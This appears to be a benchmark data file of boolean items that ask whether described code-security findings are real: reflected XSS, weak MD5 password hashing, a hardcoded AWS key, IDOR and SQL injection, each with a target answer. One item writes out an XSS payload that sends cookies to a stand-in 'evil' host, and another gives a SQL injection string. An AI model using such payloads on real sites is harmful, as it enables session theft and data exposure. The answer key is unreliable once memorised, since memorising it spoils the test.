{"id": "ais-web-013", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The PHP page does echo 'You searched for ' . $_GET['q'];. The query parameter is echoed into the HTML response with no htmlspecialchars and no Content-Type restriction, so ?q=<script>document.location='//evil/'+document.cookie</script> executes in the victim browser. CWE-79 reflected XSS, confirmed reflection into an executable HTML context. Severity: MEDIUM.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": true}
{"id": "ais-web-014", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "User input is rendered into the page here, which suggests XSS. However the value is wrapped in htmlspecialchars($name, ENT_QUOTES, 'UTF-8') before being echoed into the HTML body, and it is not placed in a script or attribute-without-quotes context. The output is properly encoded for the context, so reflected XSS is not exploitable. No finding.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": false}
{"id": "ais-web-015", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The registration handler stores passwords with hashlib.md5(password.encode()).hexdigest() and no salt. The resulting digest is written to the users table. MD5 is a fast, broken hash and the absence of a per-user salt means the whole table is crackable with rainbow tables once leaked. CWE-916 use of a weak password hash. The plaintext password reaches the md5 sink on every signup. Severity: MEDIUM.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": true}
{"id": "ais-web-016", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The code computes hashlib.md5(file_bytes).hexdigest() and flags as weak hashing (CWE-327). But the digest is used only as an ETag / cache key for static asset versioning, not for passwords, signatures, or any security decision. MD5 for a non-security content fingerprint is acceptable. This is not a reportable cryptographic vulnerability.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": false}
{"id": "ais-web-017", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "Line 12 contains AWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' and it is passed into boto3.client('s3', aws_secret_access_key=AWS_SECRET). A live secret access key is committed in source and used to sign requests; anyone with repo read access gains the credential. CWE-798 hardcoded credentials. The literal flows directly into the SDK client. Severity: HIGH.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": true}
{"id": "ais-web-018", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The S3 client is initialized from os.environ['AWS_SECRET_ACCESS_KEY']. There is no hardcoded credential in the source — the value is injected from the environment at runtime. I would still recommend periodic key rotation and scoping the IAM policy. That is an operational best practice; the code itself does not expose a secret.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": false}
{"id": "ais-web-019", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The Spring controller @GetMapping(\"/account/{id}\") does return accountRepo.findById(id) using the path variable directly, with no check that the authenticated principal owns that account. Any logged-in user can iterate id values to read other customers' balances. CWE-639 IDOR / broken object-level authorization. The id source reaches the data lookup with no ownership predicate. Severity: HIGH.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": true}
{"id": "ais-web-020", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The signup handler stores passwords with bcrypt.hashpw(password, bcrypt.gensalt(12)). This is a strong, salted, adaptive hash. I initially noted 'password storage' as a concern, but the implementation follows current guidance (CWE-916 does not apply). There is no weak-hash finding here; the code is correct.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": false}
{"id": "ais-web-021", "side": "offensive", "category": "off_scanner_adjudication", "type": "boolean", "state": "The DAO builds String sql = \"SELECT * FROM orders WHERE ref='\" + request.getParameter(\"ref\") + \"'\" and runs it with statement.executeQuery(sql). The request parameter is concatenated into the SQL and executed via a plain Statement, not a PreparedStatement. CWE-89 SQL injection; ' OR '1'='1 returns all rows. Confirmed taint from getParameter to executeQuery. Severity: HIGH.", "question": "Is this a real, reportable security finding?", "criteria": {"true": "a real, exploitable vulnerability confirmed by the analysis", "false": "speculation / hedged / theoretical / hallucinated / best-practice — not a confirmed finding"}, "target": true}
